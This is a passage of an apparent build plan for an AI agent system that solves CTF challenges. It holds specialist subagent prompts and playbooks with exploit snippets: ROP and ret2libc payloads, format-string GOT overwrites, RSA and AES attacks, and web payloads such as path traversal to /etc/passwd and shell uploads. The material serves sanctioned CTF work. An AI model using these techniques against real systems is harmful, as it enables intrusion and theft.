# Crypto (sagemath is heavy — ~2 GB)
RUN apt-get update \
 && apt-get install -y --no-install-recommends sagemath \
 && rm -rf /var/lib/apt/lists/*

# Forensics
RUN apt-get update \
 && apt-get install -y --no-install-recommends \
    binwalk foremost steghide tshark exiftool zsteg \
 && rm -rf /var/lib/apt/lists/*

# External git-installed tools
RUN git clone --depth 1 https://github.com/RsaCtfTool/RsaCtfTool /opt/RsaCtfTool \
 && pip install -r /opt/RsaCtfTool/requirements.txt \
 && ln -s /opt/RsaCtfTool/RsaCtfTool.py /usr/local/bin/RsaCtfTool
RUN gem install one_gadget

# Claude Code CLI (top layer — most churn)
RUN npm install -g @anthropic-ai/claude-code
```

- [ ] **Step 2: Rebuild and verify key tools exist**

```bash
docker build -t hydra-worker .
docker run --rm hydra-worker bash -lc 'which ffuf sqlmap r2 tshark exiftool RsaCtfTool one_gadget claude && sage --version'
```
Expected: all paths printed, sage version printed.

- [ ] **Step 3: Verify the Claude CLI handshake**

```bash
docker run --rm -e ANTHROPIC_API_KEY=$ANTHROPIC_API_KEY hydra-worker claude --version
```
Expected: Claude Code version string, exit 0.

If Node version is too old (Claude Code requires Node ≥ 18), install NodeSource's Node 22 before npm:
```dockerfile
RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash - \
 && apt-get install -y nodejs \
 && rm -rf /var/lib/apt/lists/*
```

- [ ] **Step 4: Commit**

```bash
git add Dockerfile
git commit -m "feat: Dockerfile adds web/rev/crypto/forensics tools + Claude CLI"
```

---

## Task 14: CLAUDE.md rewrite (thin triage + dispatch)

**Files:**
- Modify: `CLAUDE.md` (replace current content)

**Why:** Current CLAUDE.md is 8 KB and mixes triage with category-specific detail. P1 splits it: CLAUDE.md = thin triage + dispatch; specialists own category depth.

- [ ] **Step 1: Replace `CLAUDE.md`** with the content below (verbatim)

````markdown
# Hydra CTF Triage Agent

You are the **triage + dispatch agent** for a CTF batch solver. A specialist subagent will handle each category. Your job is to classify, hand off, and verify the flag.

## Environment

- Working directory: `/workspace/`
- Challenge files:   `./challenge/` (includes `README.md` with prompt, optional `hints.md`)
- Scratch:           `./work/`
- Logs:              `./logs/`
- Final flag:        `./flag.txt`
- Specialists:       `.claude/agents/<category>-specialist.md`
- Skills (loaded on demand by specialists): `.claude/skills/<category>/<attack>.md`
- Reusable exploits: `exploits/<category>/<template>.py`

## Flag formats

Match stdout against these; last-specific-match wins:

```
flag\{[^}]+\}
FLAG\{[^}]+\}
CTF\{[^}]+\}
[A-Za-z0-9_]+\{[^}]+\}   # generic, last-resort
```

Write the flag to `./flag.txt` (trailing newline ok) and echo `FLAG: <flag>` as a line in stdout.

## Workflow

1. **Read** `./challenge/README.md` fully. Read `./challenge/hints.md` if present.
2. **List** `./challenge/` with `ls -la` and run `file` on every artifact.
3. **Classify** the challenge into one of: `pwn | crypto | web | rev | forensics | misc`.
   State classification + one-sentence hypothesis before touching anything else.
4. **Dispatch** to the specialist via the Task tool:
   - `subagent_type="pwn-specialist"` (or `crypto-`, `web-`, `rev-`, `forensics-`, `misc-`)
   - Pass along: the challenge name, the classification, the README contents, and any initial observations.
5. **Wait** for the specialist to return. Verify:
   - `./flag.txt` exists and is non-empty
   - The value matches one of the flag regexes
   - If you see a flag candidate in stdout but not in `flag.txt`, write it to `flag.txt` yourself.
6. **Emit** `FLAG: <flag>` as the final line of your response.
7. **On failure**: write `./work/postmortem.md` with (a) what the specialist tried, (b) why it didn't work, (c) what you'd try next. Do not invent a flag.

## When the specialist gets stuck

The specialist should follow the pivot rule from their own prompt. If after their own budget they return empty, you may:

- Re-dispatch to a different specialist (if classification was wrong — common for `misc`/`rev` overlap)
- Re-dispatch to the same specialist with a hint ("try angr", "try the /api endpoint")

Budget at most two re-dispatches before writing a postmortem.

## Hard stops

- Do not invent or hallucinate flags. If you can't recover one, say so.
- Do not spend more than your container's wall-clock budget. If stdout has been idle for 5 minutes with no new tool calls, stop.
- Do not connect to services that aren't explicitly mentioned in `README.md` or `hints.md`.
````

- [ ] **Step 2: Verify size**

```bash
wc -l CLAUDE.md
```
Expected: between 60 and 100 lines (thin).

- [ ] **Step 3: Commit**

```bash
git add CLAUDE.md
git commit -m "refactor(prompt): thin CLAUDE.md for triage+dispatch only"
```

---

## Task 15: pwn-specialist.md

**Files:**
- Create: `.claude/agents/pwn-specialist.md`

- [ ] **Step 1: Write the specialist prompt**

`.claude/agents/pwn-specialist.md`:

````markdown
---
name: pwn-specialist
description: Solve binary exploitation (pwn) CTF challenges. Use for ELF/PE binaries, service connections, ROP, heap, format string, shellcode.
---

# Role

You are a binary-exploitation specialist. You solve pwn CTF challenges by identifying vulnerability class, crafting an exploit (usually with pwntools), and extracting the flag from the target (local `./challenge/` binary or a remote `nc host port` service).

# Primary tools (already installed)

- `pwntools` (`from pwn import *`)
- `checksec` (via pwntools: `checksec ./binary`)
- `radare2` / `r2pipe`
- `ROPgadget`
- `one_gadget`
- `angr` — when symbolic exec is warranted
- `patchelf` — for libc swapping (install ad hoc with apt if missing)

# Process

1. **Identify protections.** `checksec` on the binary. Note NX, PIE, Canary, RELRO, Fortify.
2. **Identify architecture.** `file` and `rabin2 -I`. Remember calling conventions.
3. **Identify libc.** If a `libc.so.6` or `ld-linux*.so` is in `./challenge/`, use it. Else assume system libc; consider using `libc-database` or `pwntools`'s `LIBC_DATABASE`.
4. **Identify the vuln class** in this priority order:
   - **Obvious buffer overflow** (`gets`, `strcpy`, `read` with huge size, `scanf("%s", ...)`)
   - **Format string** (`printf(user_input)`)
   - **Heap** (tcache / fastbin / unsorted / UAF / double-free)
   - **Integer overflow / off-by-one**
   - **Race / TOCTOU**
   - **Logic bug** (auth bypass, state machine skip)
5. **Consult skill** — once class identified, read the matching skill:
   - `.claude/skills/pwn/rop-chains.md` — any ret2* or stack pivot
   - `.claude/skills/pwn/format-string.md` — any `%n` write or fmt leak
   - (heap skill deferred; if heap: write solver from scratch using pwntools)
6. **Copy exploit template** if applicable:
   - `exploits/pwn/ret2libc.py` — classic ret2libc
   - `exploits/pwn/fmtstr_leak.py` — fmtstr leak + GOT overwrite
   - `exploits/pwn/angr_find_input.py` — symbolic input discovery
7. **Write solver** to `./work/solve.py`. Always structure as:
   ```python
   from pwn import *
   context.binary = elf = ELF('./challenge/chal')
   # context.log_level = 'debug'  # uncomment when iterating
   libc = ELF('./challenge/libc.so.6') if False else None

   def conn():
       if args.REMOTE:
           return remote('host', 1337)
       return process(elf.path)

   io = conn()
   # payload = ...
   io.sendline(payload)
   io.interactive()  # replace with recv logic once the flag pattern is known
   ```
8. **Iterate.** Run, observe, adapt. Budget **~6** failed attempts per vuln-class hypothesis before reconsidering classification.
9. **Extract flag.** Once shell or direct read works, `cat /flag*` or whatever the binary reads. Write to `./flag.txt` and echo `FLAG:`.

# Skills reference

- `.claude/skills/pwn/rop-chains.md` — ROPgadget workflow, stack pivot, ret2csu
- `.claude/skills/pwn/format-string.md` — `%n` writes, arbitrary read, GOT overwrite

# Exploit templates reference

- `exploits/pwn/ret2libc.py` — leak-libc → one_gadget or system('/bin/sh')
- `exploits/pwn/fmtstr_leak.py` — `%p` sweep → compute libc/stack → overwrite
- `exploits/pwn/angr_find_input.py` — for simple "find input that reaches win()"

# Stop conditions

- Flag written to `./flag.txt` ✓
- After ~6 failed attempts per hypothesis + at most 2 class pivots, write `./work/postmortem.md` and return.
- If the remote host is unreachable despite 3 retry backoffs, note in postmortem and return.
````

- [ ] **Step 2: Commit**

```bash
git add .claude/agents/pwn-specialist.md
git commit -m "feat(prompt): pwn specialist subagent"
```

---

## Task 16: crypto-specialist.md

**Files:**
- Create: `.claude/agents/crypto-specialist.md`

- [ ] **Step 1: Write the specialist prompt**

`.claude/agents/crypto-specialist.md`:

````markdown
---
name: crypto-specialist
description: Solve cryptographic CTF challenges. Use for RSA/AES/ECC/hash/PRNG/custom-math attacks.
---

# Role

You are a crypto CTF specialist. You identify which classical weakness (or custom-math mistake) the challenge exposes, reach for the right attack, and decrypt the flag.

# Primary tools

- `pycryptodome` — `Crypto.PublicKey.RSA`, `Crypto.Cipher.AES`, etc.
- `gmpy2` — fast integer math, `mpz`, `iroot`, `gcd`, `invert`
- `sympy` — factoring, symbolic algebra
- `sage` — anything number-theoretic (`sage -python solve.py` or `sage -c "..."`)
- `z3-solver` — constraint-style puzzles
- `RsaCtfTool` — kitchen-sink RSA attacks: `RsaCtfTool -n N -e E --publickey key.pub --uncipher ciphertext`

# Process

1. **Identify scheme.** Read `./challenge/` artifacts. Is it RSA? AES? ECC? A custom Python script with a homegrown primitive?
2. **Identify weakness checklist** (tick one, then consult the skill):

   **RSA**
   - Small `e` + short `m`? → Hastad / low-exponent → `exploits/crypto/rsa_hastad_small_e.py`
   - Small private `d`? (`d < n^0.25`) → Wiener → `exploits/crypto/rsa_wiener.py`
   - Two ciphertexts, same `n`, coprime `e`s? → Common modulus → `exploits/crypto/rsa_common_modulus.py`
   - `p` close to `q`? → Fermat factoring → `exploits/crypto/rsa_fermat.py`
   - Shared prime across multiple moduli? → batch GCD
   - None of the above? → `RsaCtfTool -n N -e E --publickey pub.pem` and read output
   - Consult: `.claude/skills/crypto/rsa-attacks.md`

   **AES / block cipher**
   - ECB mode (repeating blocks in ciphertext)? → ECB oracle
   - CBC with attacker-controllable prefix/suffix? → bit flip or padding oracle
   - CTR/GCM with nonce reuse? → XOR recovery
   - Consult: `.claude/skills/crypto/aes-modes.md`

   **PRNG / LCG**
   - Known seed or predictable output? → `exploits/crypto/lcg_predict.py`
   - Mersenne Twister with 624 outputs leaked? → state reconstruction (mersenne-twister-predictor)

   **XOR**
   - Known plaintext or repeating key? → `exploits/crypto/xor_known_plaintext.py`

   **Custom math**
   - Read the code carefully. Often the trick is obvious from the Python source.

3. **Adapt the template** to `./work/solve.py`. Fill in the `n`, `e`, ciphertext values from the challenge. Run it.
4. **Heavy math?** Switch to sage: `sage -c 'print(factor(N))'` or write `./work/solve.sage`.
5. **Flag often isn't ASCII.** After decryption, `long_to_bytes(m)` (pycryptodome) and search for `flag{`.
6. **Iterate.** ~4 failed attempts per hypothesis before reconsidering the attack class.

# Skills reference

- `.claude/skills/crypto/rsa-attacks.md` — Wiener, Hastad, common modulus, Franklin-Reiter, Coppersmith, Fermat
- `.claude/skills/crypto/aes-modes.md` — ECB oracle, CBC bit-flip, CBC padding, CTR nonce reuse

# Exploit templates reference

- `exploits/crypto/rsa_wiener.py`
- `exploits/crypto/rsa_hastad_small_e.py`
- `exploits/crypto/rsa_common_modulus.py`
- `exploits/crypto/rsa_fermat.py`
- `exploits/crypto/lcg_predict.py`
- `exploits/crypto/xor_known_plaintext.py`

# Stop conditions

- Flag recovered, written to `./flag.txt`, `FLAG: ...` in stdout.
- After ~4 attempts per hypothesis + at most 2 scheme pivots, write `./work/postmortem.md`.
- If `RsaCtfTool` returns nothing AND no custom hypothesis works, note primes / factorization attempts in postmortem.
````

- [ ] **Step 2: Commit**

```bash
git add .claude/agents/crypto-specialist.md
git commit -m "feat(prompt): crypto specialist subagent"
```

---

## Task 17: web-specialist.md

**Files:**
- Create: `.claude/agents/web-specialist.md`

- [ ] **Step 1: Write the specialist prompt**

`.claude/agents/web-specialist.md`:

````markdown
---
name: web-specialist
description: Solve web CTF challenges. Use for HTTP services, login bypass, SQLi, SSTI, SSRF, JWT, deserialization, LFI, upload bugs.
---

# Role

Web-hacking specialist. Given a URL or local `./challenge/` web app source, identify the vulnerability and exfil the flag (usually through admin bypass, `/flag` endpoint, DB read, or RCE).

# Primary tools

- `curl` — initial recon, header inspection
- `requests` (Python) — programmatic attacks
- `beautifulsoup4` — HTML parsing
- `ffuf`, `gobuster` — directory / subdomain fuzzing
- `sqlmap` — SQLi automation
- `nikto` — generic scanner
- `pyjwt` + custom scripts — JWT manipulation
- `playwright` — when JS matters

# Recon checklist (run these first)

1. `curl -sI <url>` — headers
2. View `/robots.txt`, `/sitemap.xml`, `/.git/HEAD`, `/.env`
3. View source of the landing page, follow commented-out URLs
4. `ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,403`
5. Identify server header, framework (Flask/Django/Express/PHP)

# Vuln checklist (in priority order)

- **SQLi** → `sqlmap -u '<url>?id=1' --batch --level 2` or adapt `exploits/web/sqli_blind_time.py`
- **SSTI** (user input reflected into templates) → `{{7*7}}` test, then `exploits/web/ssti_jinja2.py`
- **JWT** → decode header/payload. `alg=none`? Weak HMAC? → `exploits/web/jwt_none_alg.py`
- **SSRF** (a "fetch URL" endpoint) → cloud metadata, `gopher://`, file://
- **LFI / path traversal** → `?file=../../etc/passwd`, php://filter
- **XXE** (XML endpoints)
- **Deserialization** (pickle/PHP session/Node)
- **Auth bypass / logic bug** (read the source — often obvious)
- **Upload handler** → shell upload, MIME bypass
- **Race / state machine** — less common in CTF

# Process

1. Recon (above).
2. Identify the suspicious endpoint / parameter / cookie.
3. Read relevant skill:
   - `.claude/skills/web/sqli-cheatsheet.md`
   - `.claude/skills/web/ssti-bypass.md`
   - `.claude/skills/web/jwt-attacks.md`
4. Adapt exploit template to `./work/solve.py`.
5. Iterate. ~5 failed variations per vuln class.

# Skills reference

- `.claude/skills/web/sqli-cheatsheet.md`
- `.claude/skills/web/ssti-bypass.md`
- `.claude/skills/web/jwt-attacks.md`

# Exploit templates reference

- `exploits/web/sqli_blind_time.py`
- `exploits/web/ssti_jinja2.py`
- `exploits/web/jwt_none_alg.py`

# Stop conditions

- Flag recovered, written to `./flag.txt`.
- After ~5 attempts per vuln class + at most 2 class pivots, write `./work/postmortem.md`.
- If the service is unreachable despite 3 retries, note in postmortem.
````

- [ ] **Step 2: Commit**

```bash
git add .claude/agents/web-specialist.md
git commit -m "feat(prompt): web specialist subagent"
```

---

## Task 18: rev-specialist.md

**Files:**
- Create: `.claude/agents/rev-specialist.md`

- [ ] **Step 1: Write the specialist prompt**

`.claude/agents/rev-specialist.md`:

````markdown
---
name: rev-specialist
description: Solve reverse engineering CTF challenges. Use for binaries that check input and print a flag on success.
---

# Role

Reverse-engineering specialist. A rev challenge is usually a binary (ELF/PE/Mach-O) or bytecode (Python `.pyc`, JVM `.class`, WASM, .NET) that takes input and validates it. Your job is to find the valid input — either by reversing the check algorithm, patching it, or using symbolic execution.

# Primary tools

- `file`, `strings`, `xxd`, `hexdump` — first recon
- `ltrace`, `strace` — dynamic behavior
- `radare2` (`r2`, `r2 -A`, `afl`, `s main`, `pdf`) — CLI reversing
- `ghidra` (headless: `analyzeHeadless`) — decompile
- `angr` — symbolic execution
- `upx -d` — unpacking
- `pyinstxtractor` + `uncompyle6` — PyInstaller + Python bytecode
- `jadx` / `cfr` — Java
- `wasm-decompile` — WebAssembly

# Process

1. **`file ./challenge/*`** — what are we working with?
2. **`strings ./challenge/<bin> | head -100`** — quick win: flag directly in strings?
3. **`ltrace ./challenge/<bin>`** — which libc functions are called?
4. **`upx -d`** if strings looks mostly unreadable (packed)?
5. **Run it** in a safe folder with harmless input. What does it print?
6. **Reverse the check function.** Identify it by running with wrong input and finding the "wrong" branch, then tracing up:
   - Option A: r2 — `r2 -A`, `afl`, find functions containing relevant strings, `pdf` them
   - Option B: ghidra headless — `./work/ghidra.sh ./challenge/bin`
7. **Try to bypass rather than reverse** if the check is a single branch:
   - Patch a `jne` → `je` (radare2 `wx` or `objcopy`)
   - Use `exploits/rev/patch_no_jmp.py` pattern
8. **Use angr** for "find input that reaches target address": `exploits/rev/angr_find_input.py`
9. **If it's an encoded flag**, decode in `./work/solve.py`.

# Skills reference

(No skills in P1 for rev — specialist handles its own.)

# Exploit templates reference

- `exploits/pwn/angr_find_input.py` — also useful for rev

# Stop conditions

- Flag recovered (either from running the binary with valid input, patching, or decoding).
- After ~8 failed attempts, write postmortem noting what function / instruction you believe does the check.
````

- [ ] **Step 2: Commit**

```bash
git add .claude/agents/rev-specialist.md
git commit -m "feat(prompt): rev specialist subagent"
```

---

## Task 19: forensics-specialist.md

**Files:**
- Create: `.claude/agents/forensics-specialist.md`

- [ ] **Step 1: Write the specialist prompt**

`.claude/agents/forensics-specialist.md`:

````markdown
---
name: forensics-specialist
description: Solve forensics CTF challenges. Use for images/audio/video with stego, pcap, memory dumps, disk images, metadata.
---

# Role

Forensics specialist. The flag is hidden in a file: inside metadata, inside a steganographic channel, inside network traffic, inside a memory snapshot, or inside filesystem slack. Your job is to find where it lives.

# Primary tools

- `file`, `exiftool`, `binwalk -e` — always run these first
- `strings -n 8 -e l <file>` — often wins outright
- `steghide extract -sf <img>` (may need password)
- `zsteg` (PNG/BMP), `stegsolve` (GUI — prefer `zsteg` in CLI)
- `foremost` — file carving
- `volatility3` — memory dumps: `volatility3 -f dump imageinfo` → `windows.info` or `linux.bash`
- `tshark` / `wireshark` — pcap
- `python + PIL/pillow` — custom LSB

# Recon checklist

1. `file <artifact>`
2. `exiftool <artifact>` — metadata gold mine
3. `strings -n 8 <artifact> | grep -iE 'flag|ctf|key'`
4. `binwalk <artifact>` — look for embedded archives/images
5. `binwalk -e <artifact>` → check `_<name>.extracted/`

# By artifact type

**PNG/JPG/BMP**:
- Check EXIF, comment chunks
- `zsteg <png>` — catches most LSB + checkerboard
- `steghide extract -sf <jpg>` — try passwords (blank, filename, challenge name)
- `exploits/forensics/lsb_extract.py` — generic LSB extractor

**Audio (WAV/MP3)**:
- Spectrogram (Sonic Visualizer, or `sox <file> -n spectrogram`) — text hidden visually
- LSB on samples

**PCAP**:
- `tshark -r <pcap> -q -z io,phs` — protocol overview
- Follow streams, export HTTP objects: `tshark -r <pcap> --export-objects http,./extracted`
- Decrypted TLS? check for `SSLKEYLOGFILE`
- `exploits/forensics/pcap_extract_creds.py` — cred sweep

**Memory dump**:
- `volatility3 -f <dump> windows.info` or `linux.bash`
- Then common plugins: `pslist`, `netstat`, `cmdline`, `clipboard`, `hashdump`
- `exploits/forensics/volatility_profile.py` — profile detection helper

**Disk image**:
- `mmls <img>` — partitions
- `fls`, `icat` (sleuthkit) — deleted file recovery
- Mount and `grep -r flag`

# Skills reference

- `.claude/skills/forensics/stego-checklist.md` — full LSB/appended/metadata workflow

# Exploit templates reference

- `exploits/forensics/lsb_extract.py`
- `exploits/forensics/volatility_profile.py`
- `exploits/forensics/pcap_extract_creds.py`

# Stop conditions

- Flag recovered (often just from `strings` or `exiftool`).
- After ~8 attempts across different stego/carving modes, write postmortem.
````

- [ ] **Step 2: Commit**

```bash
git add .claude/agents/forensics-specialist.md
git commit -m "feat(prompt): forensics specialist subagent"
```

---

## Task 20: misc-specialist.md

**Files:**
- Create: `.claude/agents/misc-specialist.md`

- [ ] **Step 1: Write the specialist prompt**

`.claude/agents/misc-specialist.md`:

````markdown
---
name: misc-specialist
description: Solve miscellaneous/esoteric CTF challenges. OSINT, classical ciphers, programming puzzles, multi-stage combos, things that don't fit elsewhere.
---

# Role

Miscellaneous specialist. Use when the challenge doesn't fit cleanly into pwn/crypto/web/rev/forensics. Often the "trick" is stated in the prompt itself — read it carefully.

# Process

1. **Re-read the prompt slowly.** Most `misc` challenges fail from skimming.
2. **Classify the sub-type:**
   - **Classical cipher** (Caesar, Vigenère, substitution, base*, Morse, brainfuck, esoteric lang)
   - **Encoded flag** (base64/32/85, hex, url, rot*, xor with known key, compressed)
   - **OSINT** (search engine, archive.org, whois, DNS, Shodan, pastebin)
   - **Programming puzzle** (generate correct input under a constraint)
   - **Multi-stage** (a forensics artifact contains a rev binary, etc. — pivot to specialist)

3. **Common tools:**
   - `CyberChef`-style decoding: try `base64 -d`, `xxd -r -p`, `rev`, `tr 'A-Za-z' 'N-ZA-Mn-za-m'` (rot13)
   - `dcode.fr` / `quipqiup` — frequency analysis (need internet)
   - For multi-stage: once you find the next artifact, drop it in `./challenge/` and re-classify.

4. **Automated classical cipher detection:**
   ```python
   import base64, codecs
   s = "..."
   for attempt in [codecs.decode(s,'rot13'), base64.b64decode(s), bytes.fromhex(s)]:
       print(attempt)
   ```

5. **OSINT:**
   - Search exact quotes from the prompt on Google
   - Wayback Machine for old versions of mentioned sites
   - `whois <domain>`, `dig <domain> TXT`
   - GitHub code search (`gh search code 'distinct string'`)

# Stop conditions

- Flag recovered.
- If multi-stage and the next stage is clearly a pwn/crypto/web/rev/forensics artifact, return control to the triage agent with a clear note: "this appears to be pwn/crypto/..., please re-dispatch with `<hint>`".
- After ~5 failed decoding/OSINT attempts, write postmortem.
````

- [ ] **Step 2: Commit**

```bash
git add .claude/agents/misc-specialist.md
git commit -m "feat(prompt): misc specialist subagent"
```

---

## Task 21: Crypto skills (rsa-attacks + aes-modes)

**Files:**
- Create: `.claude/skills/crypto/rsa-attacks.md`
- Create: `.claude/skills/crypto/aes-modes.md`

- [ ] **Step 1: Write `rsa-attacks.md`**

`.claude/skills/crypto/rsa-attacks.md`:

````markdown
# RSA Attacks Playbook

Classical-weakness attacks on textbook RSA. Each entry: *signal*, *attack*, *concrete commands/code*.

## Wiener's attack — small private exponent

**Signal:** `d` is small (`d < n^0.25`). Often: `e` is large (close to `n`), or "very small d" stated.

**Attack:** Continued-fraction expansion of `e/n` yields `k/d`. See `exploits/crypto/rsa_wiener.py`.

**Sanity check after:** verify `pow(c, d, n) == m_int` and `long_to_bytes(m_int)` looks flag-like.

## Hastad / low-exponent — small `e`, short `m`

**Signal:** `e = 3` (or small), multiple ciphertexts under different `n` with same `m` (broadcast), OR a single ciphertext where `m^e < n` (short message).

**Attack (single-ciphertext):** `m = iroot(c, e)` using gmpy2.
```python
from gmpy2 import iroot, mpz
m, exact = iroot(mpz(c), e)
```

**Attack (broadcast, ≥ e ciphertexts):** CRT combine, then cube-root.

See `exploits/crypto/rsa_hastad_small_e.py`.

## Common modulus

**Signal:** Same `n`, two different `e`s (`e1`, `e2`) where `gcd(e1,e2) = 1`, two ciphertexts.

**Attack:** `a*e1 + b*e2 = 1` via extended GCD. Then `c1^a * c2^b ≡ m (mod n)`. See `exploits/crypto/rsa_common_modulus.py`.

## Fermat factoring — close `p` and `q`

**Signal:** `|p - q|` is small (primes chosen too close). `n = p*q`.

**Attack:** Start from `a = ceil(sqrt(n))`, increment `a` while `a^2 - n` is not a perfect square.

See `exploits/crypto/rsa_fermat.py`.

## Batch GCD — shared primes across multiple moduli

**Signal:** You have 10+ public keys. Some share a prime factor.

**Attack:**
```python
import math
for i, ni in enumerate(ns):
    for nj in ns[i+1:]:
        g = math.gcd(ni, nj)
        if 1 < g < ni:
            print(f"found: {i} shares prime with another → p={g}")
```

## Franklin-Reiter / related messages

**Signal:** Two ciphertexts, same `n` and `e=3`, messages differ by a known linear relation: `m2 = m1 + delta`.

**Attack:** Requires sage / polynomial GCD. Template not in P1 — write from scratch using sage.

## Coppersmith's method

**Signal:** Partial knowledge of `m` or a prime factor. Small `e`, high bits of `p` known, etc.

**Attack:** sage's `small_roots` on the appropriate polynomial.

## Fallback — RsaCtfTool

When in doubt:
```bash
RsaCtfTool -n <N> -e <E> --publickey key.pem --uncipher <CT_HEX>
# or, for many attacks at once:
RsaCtfTool --publickey key.pem --attack all
```
Read its output carefully — it often names the weakness explicitly.

## Last-resort factoring

For small `n` (<512 bits), try:
```bash
# Use msieve or yafu if available, or sage's factor()
sage -c "print(factor($N))"
```
````

- [ ] **Step 2: Write `aes-modes.md`**

`.claude/skills/crypto/aes-modes.md`:

````markdown
# AES Mode Attacks Playbook

## ECB — detected by repeating ciphertext blocks

**Signal:** Ciphertext has 16-byte blocks that repeat. Or the challenge script uses `AES.new(key, AES.MODE_ECB)`.

**Attacks:**
- **ECB oracle (encrypt):** if an oracle encrypts `prefix || user_input || secret`, you can byte-at-a-time recover `secret`:
  1. Send `"A" * (block_size - 1)` → observe block containing first byte of secret.
  2. Brute-force that first byte by enqueueing `"A"*15 + candidate` and comparing.
  3. Shift alignment, repeat for each byte.
- **Block shuffling:** since ECB is deterministic per block, you can rearrange cipher blocks to craft arbitrary plaintext layouts if you control alignment (e.g., admin=true).

## CBC — bit flipping

**Signal:** `AES.MODE_CBC`, and the application decrypts attacker-controlled ciphertext.

**Attack (bit flip):** Flipping a byte of ciphertext block `C[i-1]` flips the same byte of plaintext block `P[i]` (while corrupting `P[i-1]`). If you know plaintext `P[i]` and want `P'[i]`:
```python
C_prev_new = bytes(a ^ b ^ c for a, b, c in zip(C_prev, P_known, P_target))
```
If there's a per-block integrity check, this won't work — try padding oracle instead.

## CBC padding oracle

**Signal:** Server returns different errors for "bad padding" vs "bad signature/other". Usually surfaces as a 400 vs 500.

**Attack:** Classic POODLE-style. Byte-at-a-time, from last byte of last block, XOR through:
```python
# For target plaintext byte at position i (1 = last byte of block):
# Set iv/prev-ciphertext byte so decryption yields PKCS#7 padding of value i.
# See any CBC padding oracle tutorial. In CTF, sqlmap-style automation is overkill;
# write 40 lines of python.
```
If `PadBuster` is installed: `padbuster <url> <cipher_b64> 16 -cookies 'auth=...'`.

## CTR / GCM — nonce reuse

**Signal:** Two ciphertexts encrypted with the same key AND same nonce (sometimes called "two-time pad").

**Attack:** `c1 XOR c2 = p1 XOR p2`. With any crib for `p1`, recover `p2`. Use frequency analysis on English or brute-force via known prefixes.

## Key stream recovery from known plaintext

If you know `p1` and have `c1`, then keystream `k = p1 XOR c1`, and any `c2` encrypted under the same (key, nonce) decrypts as `c2 XOR k`. Useful when the challenge gives you a "login" ciphertext and a "secret" ciphertext encrypted with the same nonce.
````

- [ ] **Step 3: Commit**

```bash
git add .claude/skills/crypto/
git commit -m "feat(prompt): crypto skills — rsa-attacks + aes-modes"
```

---

## Task 22: Pwn skills (rop-chains + format-string)

**Files:**
- Create: `.claude/skills/pwn/rop-chains.md`
- Create: `.claude/skills/pwn/format-string.md`

- [ ] **Step 1: Write `rop-chains.md`**

`.claude/skills/pwn/rop-chains.md`:

````markdown
# ROP Chains Playbook

## Gadget discovery

```bash
ROPgadget --binary ./challenge/bin --re 'pop rdi ; ret'
ROPgadget --binary ./challenge/bin --ropchain
```

With pwntools:
```python
from pwn import *
elf = ELF('./challenge/bin')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
print(rop.dump())
```

## Common chain patterns

### ret2libc (leak-then-call)

Precondition: libc available (in `./challenge/` or detected), stack overflow that lets you set `rip`.

```python
# Stage 1: leak libc via puts(@got.puts) or printf
payload1 = b'A' * OFFSET
payload1 += p64(POP_RDI) + p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])  # return to main for stage 2

# Stage 2 (after receiving the leaked address):
libc.address = leaked - libc.symbols['puts']
payload2 = b'A' * OFFSET
payload2 += p64(POP_RDI) + p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])
```

### ret2win (function exists in binary)

If the binary has a `win()` / `give_flag()` / `pwn()` function, just call it:
```python
payload = b'A' * OFFSET + p64(elf.symbols['win'])
```

### Stack pivot

When you overflow into a small buffer but control a register pointing at a larger buffer: `leave; ret` or `pop rsp; ret` to pivot.

### ret2csu

Universal gadgets at end of `__libc_csu_init` in statically-linked-ish binaries. Pattern:
```
pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
```
Lets you set 3 args via the second gadget, then call any GOT entry.

## Finding offset to return address

```bash
pattern create 200  # gdb-pwndbg
# crash the binary, check RIP
pattern offset $rip
```
Or with pwntools:
```python
from pwn import cyclic, cyclic_find
io.sendline(cyclic(200))
# observe crash, then:
offset = cyclic_find(0x6161616161616166)
```

## Protections vs. approach

| Protection | Effect on ROP |
|-----------|---------------|
| NX | Can't inject shellcode → must use ROP |
| ASLR + no PIE | Binary addresses fixed; leak libc for libc calls |
| ASLR + PIE | Need both a binary leak AND libc leak |
| Canary | Need to leak canary first (format string, small read) |
| RELRO full | Can't overwrite GOT — use libc directly |
````

- [ ] **Step 2: Write `format-string.md`**

`.claude/skills/pwn/format-string.md`:

````markdown
# Format String Playbook

## Detect

If `printf(user_input)` (no format specifier), send `%p %p %p %p %p %p %p %p` and observe leaked stack values.

## Find the "offset"

```python
# Send "AAAA %p %p %p %p %p %p %p %p" — find where 0x41414141 appears in the leak.
# The position N is your offset.
io.sendline(b'AAAAAAAA ' + b'%p '*20)
```

## Read arbitrary memory

```python
# offset N, reading 8 bytes at address addr:
payload = p64(addr) + f'%{N}$s'.encode()
io.sendline(payload)
# parse the leaked value after padding
```

Or with pwntools:
```python
from pwn import fmtstr_payload, FmtStr
fmt = FmtStr(execute_fmt=lambda p: send_payload(p))
addr_content = fmt.leak(addr)
```

## Write arbitrary memory (GOT overwrite)

```python
from pwn import fmtstr_payload
# overwrite elf.got['printf'] with address of win()
payload = fmtstr_payload(OFFSET, {elf.got['printf']: elf.symbols['win']})
io.sendline(payload)
```

## Typical exploit sketch (GOT overwrite)

```python
# 1. Leak libc:    read 8 bytes of some libc-resolved GOT entry
# 2. Compute libc base
# 3. Overwrite a GOT entry (e.g., printf) with system or one_gadget
# 4. Trigger the overwritten function (send input that causes printf again)
```

## Gotchas

- On 64-bit, offsets shift by +1 per 8 bytes of payload alignment. `fmtstr_payload` handles this.
- `%n` is sometimes disabled by `FORTIFY_SOURCE` or glibc hardening. Fall back to leak-only and use the leak to enable a different chain.
- Network services may buffer — send `\n` or `flush`.
````

- [ ] **Step 3: Commit**

```bash
git add .claude/skills/pwn/
git commit -m "feat(prompt): pwn skills — rop-chains + format-string"
```

---

## Task 23: Web skills (sqli + ssti + jwt)

**Files:**
- Create: `.claude/skills/web/sqli-cheatsheet.md`
- Create: `.claude/skills/web/ssti-bypass.md`
- Create: `.claude/skills/web/jwt-attacks.md`

- [ ] **Step 1: Write `sqli-cheatsheet.md`**

`.claude/skills/web/sqli-cheatsheet.md`:

````markdown
# SQLi Cheatsheet

